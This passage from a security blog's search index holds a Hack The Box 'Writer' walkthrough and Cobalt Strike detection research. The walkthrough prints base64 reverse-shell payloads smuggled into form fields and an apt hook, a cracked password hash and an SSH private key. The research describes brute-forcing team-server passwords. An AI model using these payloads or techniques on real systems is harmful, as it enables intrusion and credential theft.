form-data; name=\"title\"hack-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"tagline\"hack-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"image\"; filename=\"123.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash`\"Content-Type: image/jpeg-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"image_url\"-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"content\"asdasdasdasd-----------------------------4229921975180160461559477084--POST /dashboard/stories/add HTTP/1.1Host: writer.htbUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\\_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\\*/\\*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084Content-Length: 959Origin: http://writer.htbConnection: closeReferer: http://writer.htb/dashboard/stories/addCookie: session=eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdoUpgrade-Insecure-Requests: 1-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"author\"hack-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"title\"hack-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"tagline\"hack-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"image\"; filename=\"123.jpg\"Content-Type: image/jpeg-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"image_url\"file:///var/www/writer.htb/writer/static/img/123.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash`-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"content\"asdasdasdasd-----------------------------4229921975180160461559477084--www-data@writer:/$ ls /homels /homejohnkylewww-data@writer:/$ ls -al /home/kylels -al /home/kyletotal 28drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -&gt; /dev/null-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrcdrwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile-r-------- 1 kyle kyle   33 Aug 14 08:32 user.txtwww-data@writer:/var/www/writer2_project/writerv2$ ls -al                                                                                                                                                          ls -al                                                                                                                                                                                                             total 24                                                                                                                                                                                                           dr-xr-sr-x 3 www-data smbgroup 4096 May 19 12:32 .                                                                                                                                                                 drwxrws--- 6 www-data smbgroup 4096 Aug  2 06:52 ..                                                                                                                                                                -r-xr-s--- 1 www-data smbgroup    0 Aug 14 08:56 __init__.py                                                                                                                                                       dr-xr-s--- 2 www-data smbgroup 4096 May 19 21:06 __pycache__                                                                                                                                                       -r-xr-s--- 1 www-data smbgroup 3307 Aug 14 08:56 settings.py                                                                                                                                                       -r-xr-s--- 1 www-data smbgroup  817 Aug 14 08:56 urls.py                                                                                                                                                           -r-xr-s--- 1 www-data smbgroup  401 Aug 14 08:56 wsgi.pyDATABASES = {                                                                                                                                                                                                          'default': {                                                                                                                                                                                                         'ENGINE': 'django.db.backends.mysql',                                                                                                                                                                            'OPTIONS': {                                                                                                                                                                                                     'read\\_default\\_file': '/etc/mysql/my.cnf',                                                                                                                                                                  },  }}[client]database = devuser = djangouserpassword = DjangoSuperPassworddefault-character-set = utf8MariaDB [dev]&gt; select username,password from auth_user;select username,password from auth_user;+----------+------------------------------------------------------------------------------------------+| username | password                                                                                 |+----------+------------------------------------------------------------------------------------------+| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |+----------+------------------------------------------------------------------------------------------+1 row in set (0.001 sec)PS E:\\tools\\hashcat-5.1.0&gt; hashcat64.exe .\\hash.txt .\\rockyou.txt -m 10000 --showpbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantoniokyle@writer:~$ ls -altotal 28drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -&gt; /dev/null-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrcdrwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile-r-------- 1 kyle kyle   33 Aug 13 12:20 user.txtkyle@writer:~$ cat user.txta90cca8b34ddad84ad5f93fae43fe8d1Privilege escalationkyle@writer:/var/www/writer2_project$ iduid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)kyle@writer:~$ find / -group filter -type f 2&gt;/dev/null/etc/postfix/disclaimer  https://book.hacktricks.xyz/pentesting/pentesting-smtp  https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish  https://mobt3ath.com/uplode/books/book-27297.pdf./NATBypass -tran 2255 127.0.0.1:25sendmail.pyfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextimport smtplibimport syslhost = \"10.10.14.24\"lport = 10086rhost = \"10.10.11.101\"rport = 2255 # 489,587# create message object instancemsg = MIMEMultipart()# setup the parameters of the messagepassword = \"\" msg['From'] = \"kyle@write.htb\"msg['To'] = \"john@write.htb\"msg['Subject'] = \"This is not a drill!\"# payload message = ('asdasdasd')print(\"[*] Payload is generated : %s\" % message)msg.attach(MIMEText(message, 'plain'))server = smtplib.SMTP(host=rhost,port=rport)if server.noop()[0] != 250:    print(\"[-]Connection Error\")    exit()server.starttls()# Uncomment if log-in with authencation# server.login(msg['From'], password)server.sendmail(msg['From'], msg['To'], msg.as_string())server.quit()print(\"[***]successfully sent email to %s:\" % (msg['To']))john@writer:/home/john/.ssh$ ls -alls -altotal 20drwx------ 2 john john 4096 Jul  9 12:29 .drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..-rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys-rw------- 1 john john 2602 Jul  9 12:29 id_rsa-rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pubjohn@writer:/home/john/.ssh$id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----  https://gtfobins.github.io/gtfobins/apt-get/  https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/echo 'apt::Update::Pre-Invoke {\"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash\"};'&gt; pwnReference  https://book.hacktricks.xyz/pentesting/pentesting-smtp  https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish  https://mobt3ath.com/uplode/books/book-27297.pdf  https://gtfobins.github.io/gtfobins/apt-get/  https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
  },
  
  {
    "title": "Preparation before analysing Cobalt Strike.",
    "url": "/posts/preparation_before_analysing_CobaltStrike/",
    "categories": "Hunter, CobaltStrike",
    "tags": "",
    "date": "2021-08-12 12:13:00 +0800",
    





    
    "snippet": "PrefaceCobalt Strike is a modular attack framework that is popular with red team and penetration testers due to its ease of use and scalability.And today we will discuss the preparations before ana...",
    "content": "PrefaceCobalt Strike is a modular attack framework that is popular with red team and penetration testers due to its ease of use and scalability.And today we will discuss the preparations before analyzing Cobalt Strike. There are two main points: decompiling and packet captureDecompilingAs we all know, CobaltStrike is a commercial software and there seems to be no way to get an officially licensed version except by purchasing it. However, I have found that some security researchers upload their CobaltStrike to publicly available threat intelligence platforms. It is therefore possible to obtain CobaltStrike from these platforms, but it is important to be safe, as these tools are not secured accordingly.You can now refer to the following three links for sample CobaltStrike.  https://verify.cobaltstrike.com/  https://www.virustotal.com/gui/file/c3c243e6218f7fbaaefb916943f500722644ec396cf91f31a30c777c2d559465/detection  https://s.threatbook.cn/report/file/02fa5afe9e58cb633328314b279762a03894df6b54c0129e8a979afcfca83d51/?sign=history&amp;env=win10_1903_enx64_office2016OK, let’s start the decompilation.Idea comes with a decompiler plugin java-decompiler.jar  https://www.codenong.com/cs108912277/  https://stackoverflow.com/questions/28389006/how-to-decompile-to-java-files-intellij-ideajava -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar code/The original bytecode can be easily decompiled into java code using this decompiler tool. A jar package will be generated when the execution is complete.~/P/J/C/code ❯❯❯ ls -alh总用量 20Mdrwxrwxr-x 2 elloit elloit 4.0K 8月  13 15:31 ./drwxrwxr-x 4 elloit elloit 4.0K 8月  13 15:37 ../-rw-rw-r-- 1 elloit elloit  20M 8月  13 15:40 cobaltstrike.jarNext we create a project to develop it twice.Recompile and run it.TLS Packet captureThe communication between Beacon or CobaltStrike and TeamServer is encrypted via TLS and we want to know the communication faults, we have to capture the traffic, which can be easily done with the following tool.https://github.com/neykov/extract-tls-secretsjava -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -javaagent:extract-tls-secrets-4.0.0.jar=/tmp/secrets.log -jar cobaltstrike.jarReference  https://verify.cobaltstrike.com/  https://www.virustotal.com/gui/file/c3c243e6218f7fbaaefb916943f500722644ec396cf91f31a30c777c2d559465/detection  https://s.threatbook.cn/report/file/02fa5afe9e58cb633328314b279762a03894df6b54c0129e8a979afcfca83d51/?sign=history&amp;env=win10_1903_enx64_office2016  https://stackoverflow.com/questions/28389006/how-to-decompile-to-java-files-intellij-idea  https://www.codenong.com/cs108912277/  https://github.com/neykov/extract-tls-secrets"
  },
  
  {
    "title": "An analysis of CobaltStrike phishing site detection (chinese)",
    "url": "/posts/Cobalt_Strike_phishing_site_detection/",
    "categories": "Hunter, CobaltStrike",
    "tags": "",
    "date": "2021-06-21 12:13:00 +0800",
    





    
    "snippet": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.浅析 CobaltStrike Beacon Staging Server 扫描0x01 前言对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。近期，我们留意到有国外安全研究人员在github上...",
    "content": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.浅析 CobaltStrike Beacon Staging Server 扫描0x01 前言对网络空间测绘数据的分析和发掘，是Quake团队一直以来的核心目标。近期，我们留意到有国外安全研究人员在github上发布了一个Cobalt Strike Beacon的扫描工具，可以提取Beacon的配置信息。于是经过Quake团队小伙伴一致努力下，将此功能集成入Quake系统，经过一小段时间的扫描颇见成效。下面我们将详细介绍Beacon Staging Server扫描的原理。0x02 Beacon是什么从事渗透测试、红队攻防的小伙伴一定对这个概念并不陌生，我们这里直接使用Gcow安全团队文章里的一段介绍：Beacon是Cobalt Strike运行在目标主机上的payload，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我们可以将其嵌入到可执行文件、添加到Word文档或者通过利用主机漏洞来传递Beacon。一图胜千言，本次我们通过主动测绘发现的就是团队服务器中的Beacon Listener。0x03 Beacon Staging ServerBeacon Staging Server的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递。首先通过投递一个被称为stager的小巧的payload，然后去Beacon staging server下载体积较大更复杂的stage，并且访问stage的URL通过checksum8进行校验。当存储着Beacon配置和payload的stage服务器暴露在公网上的时候，是可以通过主动测绘手段发现的。不幸的是，默认情况下访问该服务是一个伪装的404页面。这也导致了各类扫描器、空间测绘系统、威胁情报平台等并不能基于页面response信息进行有效判断。如果不经过专门的扫描识别，一个Beacon Staging Server应该只会返回下图红框内的信息。需要拿到具体的Stage，就必须知道URL的生成算法。这段算法来自于公开的NSE脚本，我们使用以下脚本进行校验码的生成，并且可以根据不同的输入生成32位或64位的payload的校验码。通过拼接校验码到URL，我们便可以直接下载到Beacon的stage文件，而不是一个404页面。0x04 解析Beacon配置从Beacon staging server成功下载到stage后，我们需要对其进行解析。JPCERT在2018年发布了一个Volatility 插件cobaltstrikescan，用来解析Beacon的配置和payload。0x05 Quake主动测绘在明确了Beacon Staging Server的工作原理后，我们首先利用如下Quake搜索语法找出一批原始目标：response:”HTTP/1.1 404 Not Found” AND response:”Content-Type: text/plain” AND response:”Content-Length: 0” AND NOT response:”Server: “ AND NOT response:”Connection: “然后将上述结果中的IP进行针对性识别，最终我们将提取到的Beacon配置信息追加到了response端口相应之后：可以使用Quake搜索语法直接进行查询：app:\"CobaltStrike-Beacon服务端\"同时Quake对Beacon的配置也进行了深度解析，可以点击beacon协议查看：{\"x86\": {\"payloadtype\": \"Beacon 类型\",\"port\": \"端口\",\"sleeptime\": \"60000\", Beacon 默认心跳时间，每一分钟目标主机与teamserver通信一次。\"c2\\_server\": \"C2 server\", C2服务器地址，以及URL路径\"user\\_agent\": \"ua\",\"post\\_uri\": \"/submit.php\",\"jitter\": \"0\", 针对睡眠时间的抖动率，随机睡眠。\"pipename\": \"smb beacon之间的通信的管道名称\" ,\"maxdns\": \"255\", 通过DNS上传数据时，主机名最大长度\"dns\\_idle\": \"0.0.0.0\", 表示改IP没有可用的任务,避免使用Bogon地址\"dns\\_sleep\": \"0\",每个单独的DNS请求前强制睡眠时间毫秒\"method1\": \"GET\",\"method2\": \"POST\",\"usescookies\": \"1\",\"spawnto\\_x86\": \"x86默认打开并注入shellcode的进程\",\"spawnto\\_x64\": \"x64默认打开并注入shellcode的进程\",\"proxy\\_type\": \"IE settings\", 代理类型// 进程注入选项\"process\\_inject\\_start\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\", 使用RWX作为注入内容的初始权限。另一种是RW。\"process\\_inject\\_use\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\", 使用RWX作为注入内容的最终权限。替代是RX。\"process\\_inject\\_min\\_alloc\": \"0\", 进程注入请求的最小内存\"process\\_inject\\_transform\\_x86\": \"NULL\", 转换成x86\"process\\_inject\\_transform\\_x64\": \"NULL\",转换成x64\"process\\_inject\\_execute\": \"\\\\x01\\\\x02\\\\x03\\\\x04\",\"process\\_inject\\_allocation\\_method\": \"0\",\"process\\_inject\\_stub\": \"F\\\\xa0úã\\\\x03äÒmaÿÆ£G\\\\xadïV\",\"publickey\": \"\" 公钥},\"x64\": {\"payloadtype\": \"\",\"port\": \"8080\",\"sleeptime\": \"60000\",\"c2\\_server\": \"l\",\"user\\_agent\": \"\",\"post\\_uri\": \"/submit.php\",\"jitter\": \"0\",\"pipename\": \"NULL\",\"maxdns\": \"255\",\"dns\\_idle\": \"0.0.0.0\",\"dns\\_sleep\": \"0\",\"method1\": \"GET\",\"method2\": \"POST\",\"usescookies\": \"1\",\"spawnto\\_x86\": \"%windir%\\\\\\\\syswow64\\\\\\\\rundll32.exe\",\"spawnto\\_x64\": \"%windir%\\\\\\\\sysnative\\\\\\\\rundll32.exe\",\"proxy\\_type\": \"IE settings\",\"process\\_inject\\_start\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\",\"process\\_inject\\_use\\_rwx\": \"PAGE\\_EXECUTE\\_READWRITE\",\"process\\_inject\\_min\\_alloc\": \"0\",\"process\\_inject\\_transform\\_x86\": \"NULL\",\"process\\_inject\\_transform\\_x64\": \"NULL\",\"process\\_inject\\_execute\": \"\\\\x01\\\\x02\\\\x03\\\\x04\",\"process\\_inject\\_allocation\\_method\": \"0\",\"process\\_inject\\_stub\": \"F\\\\xa0úã\\\\x03äÒmaÿÆ£G\\\\xadïV\",\"publickey\": \"\"}}|`至此，Quake系统已经支持了2个有关Cobalt Strike的产品指纹识别，分别是：app:\"Cobalt Strike团队服务器\"app:\"CobaltStrike-Beacon服务端\"在Quake的检索结果页面上也会有标识：0x06 C2节点提取与分析在能够正常解析Beacon的配置文件后，我们可以看出c2_server字段是C2服务器及其URL的地址，因此我们进行提取和分析后发现如下几个现像：  绝大多数的C2地址就是Cobalt Strike其自身的IP，但是部分C2节点使用了域名进行连接；  相同IP的不同端口，C2节点配置不同，例如103.138.12[.]53。可以利用该现像找到C2真实IP。同时也可能说明该Cobalt Strike配置了多个C2节点：  存在多个不同的Cobalt Strike IP使用相同的C2地址现像。经过分析，可以判定这种情况是Cobalt Strike团队服务器有多个IP地址、或者有多个团队服务器：  存在一个Cobalt Strike IP使用不同C2的现像，例如搜索app: \"CobaltStrike-Beacon服务端\" AND response:\"153.92.127.212\"  大多数C2节点使用的域名是新的IoC，在VirusTotal等平台中基本不会被判黑。0x07 部分IoC截至本文编辑完成时，我们将已经识别出Beacon配置中C2地址进行了提取分析：共计777个CobaltStrike独立IP，781个Beacon** C2地址（其中独立IP580个，独立域名201个)。部分IoC如下：            CobaltStrikeBeacon IP      CobaltStrikeBeacon Port      Beacon C2 Address                  83.242.96.163      80      83.242.96.163              47.242.148.4      80      47.242.148.4              218.253.251.118      8443      218.253.251.118              5.34.181.12      5985      5.34.181.12              47.105.180.183      80      kinging.ysan.ml              185.244.149.152      443      yambanetsdev.net              23.224.41.132      80      23.224.41.132              46.148.26.246      443      199.217.117.184              185.150.117.50      443      185.150.117.50              49.234.94.85      8081      49.234.94.85              47.95.231.140      8080      47.95.231.140              176.121.14.249      80      176.121.14.249              144.217.207.21      443      52.188.209.63              185.212.47.171      443      skyler.shacknet.biz              114.118.5.108      443      114.118.5.108              39.100.224.129      8888      39.100.224.129              49.232.42.92      443      49.232.42.92              103.39.18.167      443      156.226.191.234              39.102.52.75      81      39.102.52.75              89.46.86.160      80      89.46.86.160              118.24.85.85      3306      118.24.85.85              47.95.119.10      8080      47.95.119.10              45.153.243.215      443      amajai-technologies.support              47.98.166.253      80      47.98.166.253              47.244.13.36      80      47.244.13.36              185.225.19.125      443      nguyenlieu.gratekey.com              192.144.234.207      80      192.144.234.207              51.195.35.0      8888      51.195.35.0              119.23.184.235      7777      119.23.184.235              152.32.252.47      8080      152.32.252.47              142.54.188.26      443      agturnfa.com              45.147.229.199      8080      45.147.229.199              106.55.153.204      443      106.55.153.204              49.233.155.141      7001      49.233.155.141              100.26.209.220      443      cdn.az.gov              103.73.97.119      443      103.73.97.119              114.116.33.191      8888      114.116.33.191              176.123.8.228      8000      176.123.8.228              153.92.127.204      443      io.amscloud.xyz              95.179.228.227      443      95.179.228.227              185.202.0.111      80      185.202.0.111              45.76.247.184      80      45.76.247.184              159.69.156.245      80      159.69.156.245              81.70.9.64      80      81.70.9.64              89.45.4.135      8080      89.45.4.135              185.52.3.205      443      185.52.3.205              49.232.217.171      80      49.232.217.171              78.128.113.14      443      78.128.113.14              88.99.89.152      80      88.99.89.152      由于C2节点是攻击者手工配置的，并不能保证全部都是100%判黑的依据（例如C2是内网IP或者是白名单域名），请悉知。如需获取全部IoC数据，请使用Quake系统 https://quake.360.cn 搜索：app: \"CobaltStrike-Beacon服务端\"下载。相关监管部门、企事业单位可联系当地360政企安全销售人员获取。0x08 结论正如Quake在产品发布会和今年ISC空间测绘分论坛上所讲的：网络空间测绘，始于资产，但不止于资产。我们认为，主动测绘数据将会与终端行为样本数据、网络流量通信数据一样，是未来网络安全大数据&amp;&amp;威胁情报数据的重要源头。主动测绘数据和基于测绘数据分析后形成的知识将能够极大补充我们的视野，从而开拓出更多的攻击面和领域。更多网络空间测绘领域研究内容，敬请期待~0x09 参考链接  https://blog.cobaltstrike.com/2016/06/22/talk-to-your-children-about-payload-staging/  https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability  https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb  https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html  https://www.cobaltstrike.com/help-malleable-c2  https://blog.cobaltstrike.com/2019/02/19/cobalt-strike-team-server-population-study/  https://github.com/Sentinel-One/CobaltStrikeParser/blob/master/parse_beacon_config.py  https://github.com/whickey-r7/grab_beacon_config/blob/main/grab_beacon_config.nse  https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/  http://blog.leanote.com/post/snowming/62ec1132a2c9"
  },
  
  {
    "title": "Analysis of CobaltStrike Team Server Scanning (chinese)",
    "url": "/posts/Cobalt_Strike_Team_Server_Scan/",
    "categories": "Hunter, CobaltStrike",
    "tags": "",
    "date": "2021-04-15 12:13:00 +0800",
    





    
    "snippet": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.前言Cobalt Strike 是由Strategic Cyber公司开发的一款商业化渗透测试工具。该软件具有简单易用、可扩展性高等优点，并且具备团队协作等特点，因此被广大黑客、白帽子和安全研究人员等大量装备使用...",
    "content": "AttentionThis article was written while I was in the 360 Quake Team. Copyright © qihoo 360.前言Cobalt Strike 是由Strategic Cyber公司开发的一款商业化渗透测试工具。该软件具有简单易用、可扩展性高等优点，并且具备团队协作等特点，因此被广大黑客、白帽子和安全研究人员等大量装备使用。网络空间测绘就是利用扫描发掘互联网中一切可发掘的资产和目标。Cobalt Strike 的发掘，是360 Quake团队一直以来的核心目标之一。在本文中我们将站在蓝方角度思考，通过研究Cobalt Strike客户端与服务端交互的代码逻辑，来发掘出Cobalt Strike Team Server特征，并且进行进一步探测与分析。逻辑分析Cobalt Strike 的是C/S（Client-Server）架构，有一个客户端与Team Server进行通信。首先，简单看下代码。在完成Swing组件的加载后，用户输入用户名、密码等信息后，点击Connect按钮，触发aggressor.dialogs下的Connet类的dialogAction方法。如图所示，代码逻辑会将密码传入一个SecureSocket实例的authenticate方法中。然后创建数据输出流实例，将\\x00\\x00\\xbe\\xef+ 密码长度 + 密码 + 填充字符等数据传给Team Server，如果返回51966（\\x00\\x00\\xco\\xfe）则证明密码正确。查看服务端的代码认证逻辑(ssl.SecureServerSocket.java)，发现在密码正确后返回51966(\\x00\\x00\\xca\\xfe)，密码错误返回0（\\x00\\x00\\x00\\x00）。通过Wireshark抓包如图所示，可以看到客户端发送的密码及填充字符串。通过以上代码逻辑，可以找到一个识别Cobalt Strike Team Server的方法，流程图及部分代码如下图所示：为了利用该特征获取更多资产，我们希望把Cobalt Strike 中被控制的IP给提取出来，就是Cobalt Strike 登陆后的Session Table提取出来，如图所示。同样先看下代码，在通过密码验证后，会创建一个TeamQueue的实例。通过查看该类的构造方法，发现在创建该实例的时候，同时启动了两个线程来对TeamQueue中请求和响应进行监控。如图所示，TeamQueue类的call方法中会根据传入的参数实例化一个Request对象,并添加进队列，之后TeamQueue Writer线程从队列获取请求对象，使用socket进行发送。TeamQueue Reader时刻监听着来自Team Server的响应。以上就是Cobalt Strike客户端发包和接收响应的大致逻辑。在创建TeamQueue实例后开始调用call方法来发送不同阶段的请求。我们进一步抓包分析。如图所示:结合抓包和查看代码发现客户端与服务端交互的流程如下图所示。在客户端发送aggressor.ready请求后，表示一切准备就绪，开始和服务端进行数据同步，这其中就有session table的数据。根据以上的逻辑，然后手动代码实现这几个请求，就能够在识别出Cobalt Strike后进一步爆破密码，在爆破出密码后提取出目标的受控IP。如图所示。最终的扫描流程图见附录。扫描结果分析网络空间测绘始于扫描，不止于扫描。在找到该特征后，我们开始在互联网中进行挖掘。使用搜索语句：response:”\\x00\\x00\\xca\\xfe” AND port: “50050”，可以找到存在弱口令的Cobalt Strike，我们只对部分主机进行了受控IP的提取，这步骤稍微敏感，大家可以自行操作。随机登录一台如图：通过搜索语法 response:”\\x00\\x00\\x00\\x00” AND port: “50050” AND service: “http/ssl”可以找到没有爆破出密码的Cobalt Strike，可以看到共有5173条扫描记录，1049个IP。部分IoC结论网络空间测绘，始于资产，但不止于资产。我们认为，主动测绘数据将会与终端行为样本数据、网络流量通信数据一样，是未来网络安全大数据&amp;&amp;威胁情报数据的重要源头。主动测绘数据和基于测绘数据分析后形成的知识将能够极大补充我们的视野，从而开拓出更多的攻击面和领域。更多网络空间测绘领域研究内容，敬请期待~附录"
  },
  
  {
    "title": "Analysis of open source honeypot identification and network-wide mapping (chinese)",
    "url": "/posts/hunting_opensource_honeypot/",
    "categories": "Hunter, honeypot",
    "tags": "",
    "date": "2021-01-17 12:13:00 +0800",
    





    
